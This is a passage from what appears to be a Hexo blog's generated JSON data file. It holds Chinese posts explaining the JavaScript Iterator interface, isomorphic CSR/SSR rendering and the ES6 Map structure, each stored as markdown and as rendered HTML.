rel=\"noopener\">如何加密传输和存储用户密码</a></p>\n"},{"title":"浅谈Iterator接口","date":"2018-04-21T13:47:18.000Z","_content":"\n## 简单介绍 Iterator（遍历器）\n\n> 为不同的数据结构提供统一的访问机制，只要数据结构有这种接口，就可以用 for..of 完成遍历\n\n### 遍历过程\n\n```javascript\nlet it = makeIterator([\"a\", \"b\"]);\n\nit.next(); // { value: \"a\", done: false }\nit.next(); // { value: \"b\", done: false }\nit.next(); // { value: undefined, done: true }\n```\n\n* 第一次调用 next 方法返回数据结构的第一个成员，第二次就第二个直到没有\n\n## 部署 Iterator 接口\n\n> 当使用 for..of 遍历某种数据结构，就会自动去寻找 Iterator 接口\n\n* es6 规定改接口默认部署在`Symbol.iterator`属性里面\n* 返回一个遍历器对象，该对象的本质特征就是具有 next 方法\n* 每次调用 next 方法，都会返回一个当前成员的信息对象\n\n```javascript\n//当执行for..of，会自动执行Symbol.iterator这个函数\nconst obj = {\n  [Symbol.iterator]: function() {\n    return {\n      next: function() {\n        return {\n          value: 1,\n          done: true\n        };\n      }\n    };\n  }\n};\n```\n\n> 有些数据结构，本身就具有该接口\n\n* Array\n* Map\n* Set\n* String\n* TypedArray\n* 函数的 arguments 对象\n* NodeList 对象\n\n> 对象没有部署该接口\n\n* 无法确定哪个属性先后\n* 如果实在要遍历，可以使用 map 结构\n","source":"_posts/study-iterator.md","raw":"---\ntitle: 浅谈Iterator接口\ndate: 2018-04-21 21:47:18\ntags: javascript\n---\n\n## 简单介绍 Iterator（遍历器）\n\n> 为不同的数据结构提供统一的访问机制，只要数据结构有这种接口，就可以用 for..of 完成遍历\n\n### 遍历过程\n\n```javascript\nlet it = makeIterator([\"a\", \"b\"]);\n\nit.next(); // { value: \"a\", done: false }\nit.next(); // { value: \"b\", done: false }\nit.next(); // { value: undefined, done: true }\n```\n\n* 第一次调用 next 方法返回数据结构的第一个成员，第二次就第二个直到没有\n\n## 部署 Iterator 接口\n\n> 当使用 for..of 遍历某种数据结构，就会自动去寻找 Iterator 接口\n\n* es6 规定改接口默认部署在`Symbol.iterator`属性里面\n* 返回一个遍历器对象，该对象的本质特征就是具有 next 方法\n* 每次调用 next 方法，都会返回一个当前成员的信息对象\n\n```javascript\n//当执行for..of，会自动执行Symbol.iterator这个函数\nconst obj = {\n  [Symbol.iterator]: function() {\n    return {\n      next: function() {\n        return {\n          value: 1,\n          done: true\n        };\n      }\n    };\n  }\n};\n```\n\n> 有些数据结构，本身就具有该接口\n\n* Array\n* Map\n* Set\n* String\n* TypedArray\n* 函数的 arguments 对象\n* NodeList 对象\n\n> 对象没有部署该接口\n\n* 无法确定哪个属性先后\n* 如果实在要遍历，可以使用 map 结构\n","slug":"study-iterator","published":1,"updated":"2018-04-22T04:40:03.287Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034rf003b0iofwl5vsv1i","content":"<h2 id=\"简单介绍-Iterator（遍历器）\"><a href=\"#简单介绍-Iterator（遍历器）\" class=\"headerlink\" title=\"简单介绍 Iterator（遍历器）\"></a>简单介绍 Iterator（遍历器）</h2><blockquote>\n<p>为不同的数据结构提供统一的访问机制，只要数据结构有这种接口，就可以用 for..of 完成遍历</p>\n</blockquote>\n<h3 id=\"遍历过程\"><a href=\"#遍历过程\" class=\"headerlink\" title=\"遍历过程\"></a>遍历过程</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> it = makeIterator([<span class=\"string\">\"a\"</span>, <span class=\"string\">\"b\"</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">it.next(); <span class=\"comment\">// &#123; value: \"a\", done: false &#125;</span></span><br><span class=\"line\">it.next(); <span class=\"comment\">// &#123; value: \"b\", done: false &#125;</span></span><br><span class=\"line\">it.next(); <span class=\"comment\">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>第一次调用 next 方法返回数据结构的第一个成员，第二次就第二个直到没有</li>\n</ul>\n<h2 id=\"部署-Iterator-接口\"><a href=\"#部署-Iterator-接口\" class=\"headerlink\" title=\"部署 Iterator 接口\"></a>部署 Iterator 接口</h2><blockquote>\n<p>当使用 for..of 遍历某种数据结构，就会自动去寻找 Iterator 接口</p>\n</blockquote>\n<ul>\n<li>es6 规定改接口默认部署在<code>Symbol.iterator</code>属性里面</li>\n<li>返回一个遍历器对象，该对象的本质特征就是具有 next 方法</li>\n<li>每次调用 next 方法，都会返回一个当前成员的信息对象</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//当执行for..of，会自动执行Symbol.iterator这个函数</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> obj = &#123;</span><br><span class=\"line\">  [<span class=\"built_in\">Symbol</span>.iterator]: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">      next: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">          value: <span class=\"number\">1</span>,</span><br><span class=\"line\">          done: <span class=\"literal\">true</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>有些数据结构，本身就具有该接口</p>\n</blockquote>\n<ul>\n<li>Array</li>\n<li>Map</li>\n<li>Set</li>\n<li>String</li>\n<li>TypedArray</li>\n<li>函数的 arguments 对象</li>\n<li>NodeList 对象</li>\n</ul>\n<blockquote>\n<p>对象没有部署该接口</p>\n</blockquote>\n<ul>\n<li>无法确定哪个属性先后</li>\n<li>如果实在要遍历，可以使用 map 结构</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"简单介绍-Iterator（遍历器）\"><a href=\"#简单介绍-Iterator（遍历器）\" class=\"headerlink\" title=\"简单介绍 Iterator（遍历器）\"></a>简单介绍 Iterator（遍历器）</h2><blockquote>\n<p>为不同的数据结构提供统一的访问机制，只要数据结构有这种接口，就可以用 for..of 完成遍历</p>\n</blockquote>\n<h3 id=\"遍历过程\"><a href=\"#遍历过程\" class=\"headerlink\" title=\"遍历过程\"></a>遍历过程</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> it = makeIterator([<span class=\"string\">\"a\"</span>, <span class=\"string\">\"b\"</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">it.next(); <span class=\"comment\">// &#123; value: \"a\", done: false &#125;</span></span><br><span class=\"line\">it.next(); <span class=\"comment\">// &#123; value: \"b\", done: false &#125;</span></span><br><span class=\"line\">it.next(); <span class=\"comment\">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>第一次调用 next 方法返回数据结构的第一个成员，第二次就第二个直到没有</li>\n</ul>\n<h2 id=\"部署-Iterator-接口\"><a href=\"#部署-Iterator-接口\" class=\"headerlink\" title=\"部署 Iterator 接口\"></a>部署 Iterator 接口</h2><blockquote>\n<p>当使用 for..of 遍历某种数据结构，就会自动去寻找 Iterator 接口</p>\n</blockquote>\n<ul>\n<li>es6 规定改接口默认部署在<code>Symbol.iterator</code>属性里面</li>\n<li>返回一个遍历器对象，该对象的本质特征就是具有 next 方法</li>\n<li>每次调用 next 方法，都会返回一个当前成员的信息对象</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//当执行for..of，会自动执行Symbol.iterator这个函数</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> obj = &#123;</span><br><span class=\"line\">  [<span class=\"built_in\">Symbol</span>.iterator]: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">      next: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">          value: <span class=\"number\">1</span>,</span><br><span class=\"line\">          done: <span class=\"literal\">true</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>有些数据结构，本身就具有该接口</p>\n</blockquote>\n<ul>\n<li>Array</li>\n<li>Map</li>\n<li>Set</li>\n<li>String</li>\n<li>TypedArray</li>\n<li>函数的 arguments 对象</li>\n<li>NodeList 对象</li>\n</ul>\n<blockquote>\n<p>对象没有部署该接口</p>\n</blockquote>\n<ul>\n<li>无法确定哪个属性先后</li>\n<li>如果实在要遍历，可以使用 map 结构</li>\n</ul>\n"},{"title":"浅谈同构（CSR+SSR）","date":"2018-05-24T02:45:28.000Z","_content":"\n# 什么是同构\n\n> 维基百科：在抽象代数中，同构（英语：isomorphism）指的是一个保持结构的双射。在更一般的范畴论语言中，同构指的是一个态射，且存在另一个态射，使得两者的复合是一个恒等态射。\n\n* 一套代码既可以在服务端运行，又可以在客户端运行，这就是同构应用。\n* 服务端直出（html 字符串）和客户端渲染的组合，能够充分结合两者的优势，并有效避免两者的不足。\n* 具备单页应用和多页应用的所有优势\n\n## 服务端渲染和客户端渲染\n\n> 以下叫做 SSR 和 CSR\n\n* ssr 的话，服务器返回的结构相对完整的 html 文件，通过解析 html 文件，浏览器就可以渲染出来页面。\n* csr 的话，拿到的只是包含 js 代码的 html 文件，在浏览器渲染页面之前，需要动态创建 html 标签\n\n### CSR 的优势\n\n> 即单页应用的优势\n\n* 局部刷新。不用每次都进行完整页面请求。\n* 懒加载。如在页面初始的时候可以只加载可视区域内的数据，滚动后加载别的。\n* 富交互。js 实现各种炫酷效果。\n* 节约服务器成本。省电省钱。\n\n### SSR 的优势\n\n* 不需要下载一堆 js 和 css 后才能看到首页（首屏性能）\n* SEO\n* 对于电量不给力的手机，减少在客户端的电量消耗\n\n### 推荐阅读\n\n* [“服务端渲染”吊打“客户端渲染”的那些事](https://w3ctech.com/topic/2005)\n\n# 为什么要同构\n\n* 通过 Node 直出，将传统的三次 http 请求简化成一次 http 请求，降低首屏渲染时间\n* seo：服务端渲染对搜索引擎的爬取有着天然的优势\n\n# 同构的实现策略\n\n> 要实现同构，首先要正视一点，全盘同构是没有意义的。服务器端和浏览器端是两个不同的平台和环境，他们专注于解决各自的问题。\n\n* 能够同构的代码，直接复用\n* 无法同构的代码，封装成形式同构（具体看[react 同构与性能极致优化](http://web.jobbole.com/93421/)）\n  * 比如 User-Agent 字符串，浏览器端直接 navigation.userAgent，服务器端需要 req.get('user-agent')\n\n# 同构并没有想象中那么美\n\n> 框架可以尽力帮我们做好，比如 next.js\n\n* 性能：把原来放在几百万浏览器端的工作拿过来给服务器端做，计算力大。个性化的缓存，可以把每个用户个性化信息缓存到浏览器，这是一个天生的分布式缓存系统。\n* 不容忽视的服务器端和浏览器环境差异：dom api 在客户端找不到等\n* 内存溢出：前端代码由于浏览器环境刷新一遍内存重置的天然优势，对内存溢出没有充分考虑。\n* 异步操作：前端可以做非常复杂的请求合并和延迟处理\n\n# 推荐阅读\n\n* [精读前后端渲染之争](https://github.com/camsong/blog/issues/8)\n* [同构 mvc 的前端实践](https://github.com/Lucifier129/Lucifier129.github.io/issues/14)\n* [react 同构与性能极致优化](http://web.jobbole.com/93421/)\n* [解密 Vue SSR](https://juejin.im/post/5b063962f265da0ddb63dac3?utm_medium=fe&utm_source=weixinqun)\n","source":"_posts/study-isomorphism.md","raw":"---\ntitle: 浅谈同构（CSR+SSR）\ndate: 2018-05-24 10:45:28\ntags: 浏览器\n---\n\n# 什么是同构\n\n> 维基百科：在抽象代数中，同构（英语：isomorphism）指的是一个保持结构的双射。在更一般的范畴论语言中，同构指的是一个态射，且存在另一个态射，使得两者的复合是一个恒等态射。\n\n* 一套代码既可以在服务端运行，又可以在客户端运行，这就是同构应用。\n* 服务端直出（html 字符串）和客户端渲染的组合，能够充分结合两者的优势，并有效避免两者的不足。\n* 具备单页应用和多页应用的所有优势\n\n## 服务端渲染和客户端渲染\n\n> 以下叫做 SSR 和 CSR\n\n* ssr 的话，服务器返回的结构相对完整的 html 文件，通过解析 html 文件，浏览器就可以渲染出来页面。\n* csr 的话，拿到的只是包含 js 代码的 html 文件，在浏览器渲染页面之前，需要动态创建 html 标签\n\n### CSR 的优势\n\n> 即单页应用的优势\n\n* 局部刷新。不用每次都进行完整页面请求。\n* 懒加载。如在页面初始的时候可以只加载可视区域内的数据，滚动后加载别的。\n* 富交互。js 实现各种炫酷效果。\n* 节约服务器成本。省电省钱。\n\n### SSR 的优势\n\n* 不需要下载一堆 js 和 css 后才能看到首页（首屏性能）\n* SEO\n* 对于电量不给力的手机，减少在客户端的电量消耗\n\n### 推荐阅读\n\n* [“服务端渲染”吊打“客户端渲染”的那些事](https://w3ctech.com/topic/2005)\n\n# 为什么要同构\n\n* 通过 Node 直出，将传统的三次 http 请求简化成一次 http 请求，降低首屏渲染时间\n* seo：服务端渲染对搜索引擎的爬取有着天然的优势\n\n# 同构的实现策略\n\n> 要实现同构，首先要正视一点，全盘同构是没有意义的。服务器端和浏览器端是两个不同的平台和环境，他们专注于解决各自的问题。\n\n* 能够同构的代码，直接复用\n* 无法同构的代码，封装成形式同构（具体看[react 同构与性能极致优化](http://web.jobbole.com/93421/)）\n  * 比如 User-Agent 字符串，浏览器端直接 navigation.userAgent，服务器端需要 req.get('user-agent')\n\n# 同构并没有想象中那么美\n\n> 框架可以尽力帮我们做好，比如 next.js\n\n* 性能：把原来放在几百万浏览器端的工作拿过来给服务器端做，计算力大。个性化的缓存，可以把每个用户个性化信息缓存到浏览器，这是一个天生的分布式缓存系统。\n* 不容忽视的服务器端和浏览器环境差异：dom api 在客户端找不到等\n* 内存溢出：前端代码由于浏览器环境刷新一遍内存重置的天然优势，对内存溢出没有充分考虑。\n* 异步操作：前端可以做非常复杂的请求合并和延迟处理\n\n# 推荐阅读\n\n* [精读前后端渲染之争](https://github.com/camsong/blog/issues/8)\n* [同构 mvc 的前端实践](https://github.com/Lucifier129/Lucifier129.github.io/issues/14)\n* [react 同构与性能极致优化](http://web.jobbole.com/93421/)\n* [解密 Vue SSR](https://juejin.im/post/5b063962f265da0ddb63dac3?utm_medium=fe&utm_source=weixinqun)\n","slug":"study-isomorphism","published":1,"updated":"2018-05-24T07:48:39.356Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034rh003d0iofwukfqlsz","content":"<h1 id=\"什么是同构\"><a href=\"#什么是同构\" class=\"headerlink\" title=\"什么是同构\"></a>什么是同构</h1><blockquote>\n<p>维基百科：在抽象代数中，同构（英语：isomorphism）指的是一个保持结构的双射。在更一般的范畴论语言中，同构指的是一个态射，且存在另一个态射，使得两者的复合是一个恒等态射。</p>\n</blockquote>\n<ul>\n<li>一套代码既可以在服务端运行，又可以在客户端运行，这就是同构应用。</li>\n<li>服务端直出（html 字符串）和客户端渲染的组合，能够充分结合两者的优势，并有效避免两者的不足。</li>\n<li>具备单页应用和多页应用的所有优势</li>\n</ul>\n<h2 id=\"服务端渲染和客户端渲染\"><a href=\"#服务端渲染和客户端渲染\" class=\"headerlink\" title=\"服务端渲染和客户端渲染\"></a>服务端渲染和客户端渲染</h2><blockquote>\n<p>以下叫做 SSR 和 CSR</p>\n</blockquote>\n<ul>\n<li>ssr 的话，服务器返回的结构相对完整的 html 文件，通过解析 html 文件，浏览器就可以渲染出来页面。</li>\n<li>csr 的话，拿到的只是包含 js 代码的 html 文件，在浏览器渲染页面之前，需要动态创建 html 标签</li>\n</ul>\n<h3 id=\"CSR-的优势\"><a href=\"#CSR-的优势\" class=\"headerlink\" title=\"CSR 的优势\"></a>CSR 的优势</h3><blockquote>\n<p>即单页应用的优势</p>\n</blockquote>\n<ul>\n<li>局部刷新。不用每次都进行完整页面请求。</li>\n<li>懒加载。如在页面初始的时候可以只加载可视区域内的数据，滚动后加载别的。</li>\n<li>富交互。js 实现各种炫酷效果。</li>\n<li>节约服务器成本。省电省钱。</li>\n</ul>\n<h3 id=\"SSR-的优势\"><a href=\"#SSR-的优势\" class=\"headerlink\" title=\"SSR 的优势\"></a>SSR 的优势</h3><ul>\n<li>不需要下载一堆 js 和 css 后才能看到首页（首屏性能）</li>\n<li>SEO</li>\n<li>对于电量不给力的手机，减少在客户端的电量消耗</li>\n</ul>\n<h3 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h3><ul>\n<li><a href=\"https://w3ctech.com/topic/2005\" target=\"_blank\" rel=\"noopener\">“服务端渲染”吊打“客户端渲染”的那些事</a></li>\n</ul>\n<h1 id=\"为什么要同构\"><a href=\"#为什么要同构\" class=\"headerlink\" title=\"为什么要同构\"></a>为什么要同构</h1><ul>\n<li>通过 Node 直出，将传统的三次 http 请求简化成一次 http 请求，降低首屏渲染时间</li>\n<li>seo：服务端渲染对搜索引擎的爬取有着天然的优势</li>\n</ul>\n<h1 id=\"同构的实现策略\"><a href=\"#同构的实现策略\" class=\"headerlink\" title=\"同构的实现策略\"></a>同构的实现策略</h1><blockquote>\n<p>要实现同构，首先要正视一点，全盘同构是没有意义的。服务器端和浏览器端是两个不同的平台和环境，他们专注于解决各自的问题。</p>\n</blockquote>\n<ul>\n<li>能够同构的代码，直接复用</li>\n<li>无法同构的代码，封装成形式同构（具体看<a href=\"http://web.jobbole.com/93421/\" target=\"_blank\" rel=\"noopener\">react 同构与性能极致优化</a>）<ul>\n<li>比如 User-Agent 字符串，浏览器端直接 navigation.userAgent，服务器端需要 req.get(‘user-agent’)</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"同构并没有想象中那么美\"><a href=\"#同构并没有想象中那么美\" class=\"headerlink\" title=\"同构并没有想象中那么美\"></a>同构并没有想象中那么美</h1><blockquote>\n<p>框架可以尽力帮我们做好，比如 next.js</p>\n</blockquote>\n<ul>\n<li>性能：把原来放在几百万浏览器端的工作拿过来给服务器端做，计算力大。个性化的缓存，可以把每个用户个性化信息缓存到浏览器，这是一个天生的分布式缓存系统。</li>\n<li>不容忽视的服务器端和浏览器环境差异：dom api 在客户端找不到等</li>\n<li>内存溢出：前端代码由于浏览器环境刷新一遍内存重置的天然优势，对内存溢出没有充分考虑。</li>\n<li>异步操作：前端可以做非常复杂的请求合并和延迟处理</li>\n</ul>\n<h1 id=\"推荐阅读-1\"><a href=\"#推荐阅读-1\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://github.com/camsong/blog/issues/8\" target=\"_blank\" rel=\"noopener\">精读前后端渲染之争</a></li>\n<li><a href=\"https://github.com/Lucifier129/Lucifier129.github.io/issues/14\" target=\"_blank\" rel=\"noopener\">同构 mvc 的前端实践</a></li>\n<li><a href=\"http://web.jobbole.com/93421/\" target=\"_blank\" rel=\"noopener\">react 同构与性能极致优化</a></li>\n<li><a href=\"https://juejin.im/post/5b063962f265da0ddb63dac3?utm_medium=fe&amp;utm_source=weixinqun\" target=\"_blank\" rel=\"noopener\">解密 Vue SSR</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"什么是同构\"><a href=\"#什么是同构\" class=\"headerlink\" title=\"什么是同构\"></a>什么是同构</h1><blockquote>\n<p>维基百科：在抽象代数中，同构（英语：isomorphism）指的是一个保持结构的双射。在更一般的范畴论语言中，同构指的是一个态射，且存在另一个态射，使得两者的复合是一个恒等态射。</p>\n</blockquote>\n<ul>\n<li>一套代码既可以在服务端运行，又可以在客户端运行，这就是同构应用。</li>\n<li>服务端直出（html 字符串）和客户端渲染的组合，能够充分结合两者的优势，并有效避免两者的不足。</li>\n<li>具备单页应用和多页应用的所有优势</li>\n</ul>\n<h2 id=\"服务端渲染和客户端渲染\"><a href=\"#服务端渲染和客户端渲染\" class=\"headerlink\" title=\"服务端渲染和客户端渲染\"></a>服务端渲染和客户端渲染</h2><blockquote>\n<p>以下叫做 SSR 和 CSR</p>\n</blockquote>\n<ul>\n<li>ssr 的话，服务器返回的结构相对完整的 html 文件，通过解析 html 文件，浏览器就可以渲染出来页面。</li>\n<li>csr 的话，拿到的只是包含 js 代码的 html 文件，在浏览器渲染页面之前，需要动态创建 html 标签</li>\n</ul>\n<h3 id=\"CSR-的优势\"><a href=\"#CSR-的优势\" class=\"headerlink\" title=\"CSR 的优势\"></a>CSR 的优势</h3><blockquote>\n<p>即单页应用的优势</p>\n</blockquote>\n<ul>\n<li>局部刷新。不用每次都进行完整页面请求。</li>\n<li>懒加载。如在页面初始的时候可以只加载可视区域内的数据，滚动后加载别的。</li>\n<li>富交互。js 实现各种炫酷效果。</li>\n<li>节约服务器成本。省电省钱。</li>\n</ul>\n<h3 id=\"SSR-的优势\"><a href=\"#SSR-的优势\" class=\"headerlink\" title=\"SSR 的优势\"></a>SSR 的优势</h3><ul>\n<li>不需要下载一堆 js 和 css 后才能看到首页（首屏性能）</li>\n<li>SEO</li>\n<li>对于电量不给力的手机，减少在客户端的电量消耗</li>\n</ul>\n<h3 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h3><ul>\n<li><a href=\"https://w3ctech.com/topic/2005\" target=\"_blank\" rel=\"noopener\">“服务端渲染”吊打“客户端渲染”的那些事</a></li>\n</ul>\n<h1 id=\"为什么要同构\"><a href=\"#为什么要同构\" class=\"headerlink\" title=\"为什么要同构\"></a>为什么要同构</h1><ul>\n<li>通过 Node 直出，将传统的三次 http 请求简化成一次 http 请求，降低首屏渲染时间</li>\n<li>seo：服务端渲染对搜索引擎的爬取有着天然的优势</li>\n</ul>\n<h1 id=\"同构的实现策略\"><a href=\"#同构的实现策略\" class=\"headerlink\" title=\"同构的实现策略\"></a>同构的实现策略</h1><blockquote>\n<p>要实现同构，首先要正视一点，全盘同构是没有意义的。服务器端和浏览器端是两个不同的平台和环境，他们专注于解决各自的问题。</p>\n</blockquote>\n<ul>\n<li>能够同构的代码，直接复用</li>\n<li>无法同构的代码，封装成形式同构（具体看<a href=\"http://web.jobbole.com/93421/\" target=\"_blank\" rel=\"noopener\">react 同构与性能极致优化</a>）<ul>\n<li>比如 User-Agent 字符串，浏览器端直接 navigation.userAgent，服务器端需要 req.get(‘user-agent’)</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"同构并没有想象中那么美\"><a href=\"#同构并没有想象中那么美\" class=\"headerlink\" title=\"同构并没有想象中那么美\"></a>同构并没有想象中那么美</h1><blockquote>\n<p>框架可以尽力帮我们做好，比如 next.js</p>\n</blockquote>\n<ul>\n<li>性能：把原来放在几百万浏览器端的工作拿过来给服务器端做，计算力大。个性化的缓存，可以把每个用户个性化信息缓存到浏览器，这是一个天生的分布式缓存系统。</li>\n<li>不容忽视的服务器端和浏览器环境差异：dom api 在客户端找不到等</li>\n<li>内存溢出：前端代码由于浏览器环境刷新一遍内存重置的天然优势，对内存溢出没有充分考虑。</li>\n<li>异步操作：前端可以做非常复杂的请求合并和延迟处理</li>\n</ul>\n<h1 id=\"推荐阅读-1\"><a href=\"#推荐阅读-1\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://github.com/camsong/blog/issues/8\" target=\"_blank\" rel=\"noopener\">精读前后端渲染之争</a></li>\n<li><a href=\"https://github.com/Lucifier129/Lucifier129.github.io/issues/14\" target=\"_blank\" rel=\"noopener\">同构 mvc 的前端实践</a></li>\n<li><a href=\"http://web.jobbole.com/93421/\" target=\"_blank\" rel=\"noopener\">react 同构与性能极致优化</a></li>\n<li><a href=\"https://juejin.im/post/5b063962f265da0ddb63dac3?utm_medium=fe&amp;utm_source=weixinqun\" target=\"_blank\" rel=\"noopener\">解密 Vue SSR</a></li>\n</ul>\n"},{"title":"使用map数据结构","date":"2018-04-21T07:10:22.000Z","_content":"\n## object 和 map\n\n> object 映照现实生活的物体，但是想使用 key-value 的遍历结构最好使用 map 数据结构\n\n* object 结构实际上是字符串—值的结构\n* map 具有 iterator 接口，并且是值-值对映射，也就是 key 可以是 function，obj 等\n\n```javascript\nconst data = {};\nconst element = document.getElementById(\"myDiv\");\n//由于对象只接受字符串为键名，所以element被自动转化字符串\ndata[element] = \"metadata\";\ndata[\"[object HTMLDivElement]\"]; // \"metadata\"\n```\n\n## 生成 map 结构\n\n* new Map()\n* 往 new Map()里面传入任何具有 iterator 接口的数据结构，包括数组等，甚至包括 map 本身\n\n> 需要注意的是，map 的 key 存的是内存地址，也就是说['a']和['a']不相等。基础值才相等\n\n```javascript\nconst map = new Map();\n\nmap.set([\"a\"], 555);\nmap.get([\"a\"]); // undefined\n\nconst k1 = [\"a\"];\nconst k2 = [\"a\"];\n\nmap.set(k1, 111).set(k2, 222);\n\nmap.get(k1); // 111\nmap.get(k2); // 222\n```\n\n## 实例属性和方法\n\n* size：返回成员总数\n* set(key, value)：返回该实例，如果 key 有值会更新，没有就新生成\n* get(key)：找到就返回，没有就 undefined\n* has(key)：布尔值\n* delete(key)：删除成功返回 true，失败 false\n* clear：清除所有成员，没有返回值\n\n> 遍历方法与 set 类似，但是没有 filter 和 map\n\n* 比较有意思的是，map 结构默认的 iterator 接口就是 entries 方法\n\n```javascript\nfor (let [key, value] of map.entries()) {\n  console.log(key, value);\n}\n// \"F\" \"no\"\n// \"T\" \"yes\"\n\n// 等同于使用map.entries()\nfor (let [key, value] of map) {\n  console.log(key, value);\n}\n// \"F\" \"no\"\n// \"T\" \"yes\"\n```\n\n## 应用\n\n### 与其他数据结构的互相转换\n\n* map 转为数组，使用...运算符\n\n```javascript\nconst myMap = new Map().set(true, 7).set({ foo: 3 }, [\"abc\"]);\n[...myMap];\n// [ [ true, 7 ], [ { foo: 3 }, [ 'abc' ] ] ]\n```\n\n* 数组转为 map，观察数组结构\n\n```javascript\nnew Map([[true, 7], [{ foo: 3 }, [\"abc\"]]]);\n// Map {\n//   true => 7,\n//   Object {foo: 3} => ['abc']\n// }\n```\n\n### 过滤和遍历，但是 map 本身没有 map 和 filter 方法,先转为数组，再塞回 map\n\n```javascript\nconst map0 = new Map()\n  .set(1, \"a\")\n  .set(2, \"b\")\n  .set(3, \"c\");\n\nconst map1 = new Map([...map0].filter(([k, v]) => k < 3));\n// 产生 Map 结构 {1 => 'a', 2 => 'b'}\n\nconst map2 = new Map([...map0].map(([k, v]) => [k * 2, \"_\" + v]));\n// 产生 Map 结构 {2 => '_a', 4 => '_b', 6 => '_c'}\n```\n","source":"_posts/study-map.md","raw":"---\ntitle: 使用map数据结构\ndate: 2018-04-21 15:10:22\ntags: javascript\n---\n\n## object 和 map\n\n> object 映照现实生活的物体，但是想使用 key-value 的遍历结构最好使用 map 数据结构\n\n* object 结构实际上是字符串—值的结构\n* map 具有 iterator 接口，并且是值-值对映射，也就是 key 可以是 function，obj 等\n\n```javascript\nconst data = {};\nconst element = document.getElementById(\"myDiv\");\n//由于对象只接受字符串为键名，所以element被自动转化字符串\ndata[element] = \"metadata\";\ndata[\"[object HTMLDivElement]\"]; // \"metadata\"\n```\n\n## 生成 map 结构\n\n* new Map()\n* 往 new Map()里面传入任何具有 iterator 接口的数据结构，包括数组等，甚至包括 map 本身\n\n> 需要注意的是，map 的 key 存的是内存地址，也就是说['a']和['a']不相等。基础值才相等\n\n```javascript\nconst map = new Map();\n\nmap.set([\"a\"], 555);\nmap.get([\"a\"]); // undefined\n\nconst k1 = [\"a\"];\nconst k2 = [\"a\"];\n\nmap.set(k1, 111).set(k2, 222);\n\nmap.get(k1); // 111\nmap.get(k2); // 222\n```\n\n## 实例属性和方法\n\n* size：返回成员总数\n* set(key, value)：返回该实例，如果 key 有值会更新，没有就新生成\n* get(key)：找到就返回，没有就 undefined\n* has(key)：布尔值\n* delete(key)：删除成功返回 true，失败 false\n* clear：清除所有成员，没有返回值\n\n> 遍历方法与 set 类似，但是没有 filter 和 map\n\n* 比较有意思的是，map 结构默认的 iterator 接口就是 entries 方法\n\n```javascript\nfor (let [key, value] of map.entries()) {\n  console.log(key, value);\n}\n// \"F\" \"no\"\n// \"T\" \"yes\"\n\n// 等同于使用map.entries()\nfor (let [key, value] of map) {\n  console.log(key, value);\n}\n// \"F\" \"no\"\n// \"T\" 